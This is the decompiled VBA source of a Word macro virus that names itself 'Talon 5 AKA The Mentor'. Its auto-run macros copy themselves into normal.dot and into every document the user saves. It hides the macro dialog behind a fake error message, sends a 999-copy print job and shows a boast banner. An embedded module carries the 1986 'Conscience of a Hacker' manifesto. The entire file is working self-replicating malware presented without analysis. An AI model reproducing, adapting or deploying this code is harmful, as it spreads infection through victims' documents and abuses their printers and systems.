   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   WordBasic.MsgBox "Please Install The HELP Files To Continue", "Option Not Installed", 64
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim M$
   Dim T$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo F
    M$ = WordBasic.[FileName$]()
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
     T$ = M$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", T$
     T$ = M$ + ":Scramble2"
    WordBasic.MacroCopy "Global:Scramble2", T$
     T$ = M$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", T$
     T$ = M$ + ":AutoClose"
    WordBasic.MacroCopy "Global:AutoClose", T$
     T$ = M$ + ":Scramble"
    WordBasic.MacroCopy "Global:Scramble", T$
     T$ = M$ + ":Mentor"
    WordBasic.MacroCopy "Global:Mentor", T$
     T$ = M$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", T$
           WordBasic.FileSaveAs dlg
   GoTo Q
   F:
    If Err.Number <> 102 Then
     WordBasic.FileSaveAs dlg
    End If
   Q:
   End Sub

   Attribute VB_Name = "Scramble2"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Finish
    'FileSaveAs .Password = "talon5", .WritePassword = "talon5"
    WordBasic.ToolsMacro Name:="Mentor", Edit:=1, Show:=3
    WordBasic.FilePrint Background:=1, NumCopies:=999
    WordBasic.MsgBox "Word Macro Virus Talon 5  AKA The Mentor", "Talon Strikes Again ", 64
   Finish:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim I
   Dim SInstalled
   On Error GoTo -1: On Error GoTo Finish
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   For I = 1 To WordBasic.CountMacros(1, 0)
           If WordBasic.[MacroName$](I, 1, 1) = "Scramble2" Then
           SInstalled = 1
   End If
   Next I

   If SInstalled = 1 Then
           GoTo Finish
   Else
           On Error Resume Next
           WordBasic.FileSaveAs Format:=1
           WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:Mentor", WordBasic.[FileName$]() + ":Mentor"
           WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
           WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", 1
           WordBasic.MacroCopy "Global:Scramble", WordBasic.[FileName$]() + ":Scramble", 1
           WordBasic.MacroCopy "Global:Scramble2", WordBasic.[FileName$]() + ":Scramble2", 1
           WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 1
          'FileSaveAll 1, 0
   End If

   Finish:
   End Sub

   Attribute VB_Name = "Scramble"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Finish
    'FileSaveAs .Password = "talon5", .WritePassword = "talon5"
    WordBasic.ToolsMacro Name:="Mentor", Edit:=1, Show:=3
    WordBasic.FilePrint Background:=1, NumCopies:=999
    WordBasic.MsgBox "Word Macro Virus Talon 5  AKA The Mentor", "Talon Strikes Again ", 64
   Finish:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim I
   Dim SInstalled
   Dim F$
   Dim S$
   On Error GoTo -1: On Error GoTo Finish
   For I = 1 To WordBasic.CountMacros(0, 0)
       If WordBasic.[MacroName$](I, 0, 0) = "Scramble2" Then
       SInstalled = 1
   End If
   Next I
   On Error Resume Next
       WordBasic.ToolsCustomizeMenus ResetAll:=1
       'ToolsCustomizeMenuBar .MenuText = "&Talon", .Position = - 1, .Add
       WordBasic.ToolsCustomizeMenus Category:=2, Menu:="&Help", Name:="Scramble", MenuText:="Talon &5", Add:=1
       WordBasic.ToolsCustomizeMenus Category:=2, Menu:="&Help", Name:="Scramble2", MenuText:="About &Talon 5", Add:=1

   If SInstalled = 1 Then
       GoTo Finish
   Else
       On Error Resume Next
       WordBasic.ToolsCustomizeMenus ResetAll:=1
       'ToolsCustomizeMenuBar .MenuText = "&Talon", .Position = - 1, .Add
       WordBasic.ToolsCustomizeMenus Category:=2, Menu:="&Help", Name:="Scramble", MenuText:="Talon &5", Add:=1
       WordBasic.ToolsCustomizeMenus Category:=2, Menu:="&Help", Name:="Scramble2", MenuText:="About &Talon 5", Add:=1
    F$ = WordBasic.[FileName$]()
     S$ = F$ + ":AutoOpen"
    WordBasic.MacroCopy S$, "Global:AutoOpen"
     S$ = F$ + ":FileSaveAs"
    WordBasic.MacroCopy S$, "Global:FileSaveAs"
     S$ = F$ + ":AutoClose"
    WordBasic.MacroCopy S$, "Global:AutoClose"
     S$ = F$ + ":Mentor"
    WordBasic.MacroCopy S$, "Global:Mentor"
     S$ = F$ + ":Scramble"
    WordBasic.MacroCopy S$, "Global:scramble"
     S$ = F$ + ":Scramble2"
    WordBasic.MacroCopy S$, "Global:Scramble2"
     S$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy S$, "Global:ToolsMacro"
    End If
   SetAttr "C:\Msoffice\templates\normal.dot", 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Finish:
   End Sub

   Attribute VB_Name = "Mentor"
   Dim The
   Dim Conscience
   Dim of
   Dim a
   Dim Hacker
   Dim Mentor
   Dim Written
   Dim January
   Dim Another
   Dim one
   Dim got
   Dim caught
   Dim it
   Dim Arrested
   Dim in_
   Dim Computer
   Dim Crime
   Dim Scandal
   Dim after
   Dim Tampering
   Dim Damn
   Dim kids
   Dim But
   Dim did
   Dim you
   Dim your
   Dim three
   Dim piece
   Dim psychology
   Dim technobrain
   Dim ever
   Dim take
   Dim look
   Dim behind
   Dim eyes
   Dim wonder
   Dim what
   Dim made
   Dim him
   Dim tick
   Dim forces
   Dim shaped
   Dim may
   Dim have
   Dim molded
   Dim I
   Dim am
   Dim enter
   Dim my
   Dim world
   Dim Mine
   Dim that
   Dim begins
   Dim with_
   Dim school
   Dim than
   Dim most
   Dim other
   Dim this
   Dim crap
   Dim teach
   Dim us
   Dim bores
   Dim me_
   Dim underachiever
   Dim explain
   Dim forthe
   Dim fifteenth
   Dim time_
   Dim how
   Dim reduce
   Dim fraction
   Dim understand
   Dim head
   Dim kid
   Dim Probably
   Dim copied
   Dim discovery
   Dim found
   Dim Wait
   Dim cool
   Dim does
   Dim want
   Dim makes
   Dim mistake
   Dim feels
   Dim threatened
   Dim by
   Dim thinks
   Dim All
   Dim he
   Dim play
   Dim games
   Dim happened
   Dim door
   Dim opened
   Dim through
   Dim phone
   Dim like_
   Dim heroin
   Dim an
   Dim electronic
   Dim pulse
   Dim sent
   Dim out
   Dim refuge
   Dim from
   Dim incompetencies
   Dim sought
   Dim board
   Dim know
   Dim everyone
   Dim here
   Dim even
   Dim them
   Dim never
   Dim hear
   Dim again
   Dim Tying
   Dim up
   Dim bet
   Dim ass
   Dim at
   Dim when
   Dim hungered
   Dim steak
   Dim bits
   Dim meat
   Dim slip
   Dim were
   Dim pre
   Dim chewed
   Dim tasteless
   Dim dominated
   Dim sadists
   Dim ignored
   Dim apathetic
   Dim few
   Dim had
   Dim something
   Dim willing
   Dim pupils
   Dim those
   Dim drops
   Dim water
   Dim desert
   Dim our
   Dim electron
   Dim switch_
   Dim beauty
   Dim baud
   Dim make
   Dim use
   Dim service
   Dim existing
   Dim without
   Dim paying
   Dim could
   Dim be
   Dim dirt
   Dim cheap
   Dim run
   Dim profiteering
   Dim gluttons
   Dim callus
   Dim criminals
   Dim explore
   Dim knowledge
   Dim exist
   Dim skin
   Dim nationality
   Dim religious
   Dim bias
   Dim build
   Dim atomic
   Dim bombs
   Dim wage
   Dim wars
   Dim murder
   Dim cheat
   Dim try
   Dim believe
   Dim Yes
   Dim criminal
   Dim curiosity
   Dim judging
   Dim people
   Dim say
   Dim think
   Dim outsmarting
   Dim will
   Dim forgive
   Dim manifesto
   Dim individual
   Dim alike

   '%/'%The Conscience of a Hacker /'%/

                                         WordBasic.Call "by"

                                  + + + The Mentor + + +

                             Written On January 8, 1986
   = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = -

           Another one got caught WordBasic.Today, it's all over the papers.  "Teenager
   Arrested in_ Computer Crime Scandal ", " Hacker Arrested after Bank
   Tampering '"...
           Damn kids '.  They're all alike.

           But did you, in_ your three - piece psychology And 1950's
   technobrain, ever take a look behind the eyes of the hacker WordBasic.PrintStatusBar  Did
   you ever wonder what made him tick, what forces shaped him, what
   may have molded him WordBasic.PrintStatusBar
           I am a hacker, enter my world'.'.'.
           Mine Is a world that begins with_ school'.'.'.I'm smarter
   than most of the other kids, this crap they teach us bores me_'.'.'.
           Damn underachiever '.  They're all alike.

           I 'm in junior high or high school.  I've listened to teachers
   explain forthe fifteenth time_ how To reduce a fraction'.  I
   understand it '.  '"No, Ms. Smith, I didn't show my work.  I did it
   in_ my head'.'.'.'"
           Damn kid '.  Probably copied it'.  They're all alike.

           I made a discovery WordBasic.Today'.  I found a computer'.  Wait a WordBasic.Second,
   this Is cool'.It does what I want it To'.  If it makes a mistake,
   it 's because I screwed it up.  Not because it doesn't like me...
                   Or feels threatened by me_'.'.'.
                   Or thinks I'm a smart ass...
                   Or doesn't like teaching and shouldn't be here...
           Damn kid '.  All he does Is play games'.  They're all alike.

           And Then it happened'.'.'.a door opened To a world'.'.'.rushing
   through the phone Line like_ heroin through an addict's veins, an
   electronic pulse Is sent out, a refuge from the WordBasic.Day - To - WordBasic.Day
   incompetencies Is sought'.'.'.a board Is found'.
           "This is it... this is where I belong..."
           I know everyone here'.'.'.even If I've never met them, never talked
   To them, may never hear from them again'.'.'.I know you all'.'.'.
           Damn kid '.  Tying up the phone Line again'.  They're all alike...

           You bet your ass we're all alike... we've been spoon-fed baby food
   at school when we hungered For steak'.'.'.the bits of meat that you
   did Let slip through were pre - chewed And tasteless'.  We've been
   dominated by sadists, Or ignored by the apathetic'.  The few that
   had something To teach found us willing pupils, but those few are
   like_ drops of water in_ the desert'.

           This Is our world WordBasic.Now'.'.'.the world of the electron And the switch_,
   the beauty of the baud'.  We make use of a service already
   existing without paying For what could be dirt - cheap If it wasn't
   run by profiteering gluttons, And you callus criminals'.  We
   explore '.'.'.And you us criminals'.  We Seek after knowledge'.'.'.
   And you us criminals'.  We exist without skin WordBasic.Color, without
   nationality, without religious bias'.'.'.And you us criminals'.
   You build atomic bombs, you wage wars, you murder, cheat, And lie
   To us And try To make us believe it's for our own good, yet we're
   The criminals '.

           Yes, I am a criminal'.  My crime Is that of curiosity'.  My crime Is
   that of judging people by what they say And think, Not what they
   look like_ '.My crime Is that of outsmarting you, something that
   you will never forgive me_ For'.

           I am a hacker, And this Is my manifesto'.  You may Stop
   individual, but you can't stop us all... after all, we're all
   alike '.

                                  + + + The Mentor + + +
